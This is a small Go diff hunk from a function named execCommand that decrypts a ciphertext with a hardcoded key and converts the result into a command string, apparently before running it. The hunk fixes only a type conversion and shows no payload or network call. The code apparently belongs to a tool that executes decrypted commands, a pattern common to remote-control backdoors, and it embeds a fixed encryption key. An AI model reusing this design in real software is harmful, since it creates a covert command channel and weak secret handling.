@@ -366,7 +366,8 @@ func execCommand(ciphertext string) {
 		key := []byte("pooppooppooppoop")
 		tmp := []byte(ciphertext)
 		
-		command, err := decrypt(tmp, key)
+		tmp2, err := decrypt(tmp, key)
+		command := string(tmp2)
 		if err != nil {
 			panic(err)
 		}
